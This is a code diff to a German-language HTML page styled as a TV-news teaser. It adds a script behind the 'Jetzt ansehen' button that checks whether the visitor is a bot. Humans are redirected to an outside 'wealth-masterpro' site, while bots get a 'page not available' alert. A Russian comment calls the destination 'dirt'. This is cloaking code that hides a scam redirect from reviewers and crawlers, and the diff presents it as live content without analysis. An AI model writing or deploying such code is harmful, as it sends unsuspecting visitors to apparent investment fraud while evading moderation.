@@ -60,7 +60,30 @@
 <div class="content">
   <img src="https://raw.githubusercontent.com/tmildred222/new/refs/heads/main/Screenshot%202025-04-26%20at%2023.05.52.png" alt="Diskussion im Fernsehen">
   <p>Erfahren Sie mehr über aktuelle Entwicklungen und spannende Interviews direkt im Fernsehen.</p>
-  <a href="#" class="button">Jetzt ansehen</a>
+
+  <a href="#" class="button" id="watchButton">Jetzt ansehen</a>
+
+<script>
+  document.getElementById('watchButton').addEventListener('click', async function(e) {
+    e.preventDefault();
+    try {
+      const response = await fetch('/api/check');
+      const result = await response.json();
+      
+      if (result.status === 'ok') {
+        // Если человек — редиректим на грязь
+        window.location.href = 'https://wealth-masterpro.com/de/';
+      } else {
+        // Если бот — ничего не делаем
+        alert('Seite nicht verfügbar.');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      alert('Etwas ist schief gelaufen.');
+    }
+  });
+</script>
+
 </div>
 
 </body>
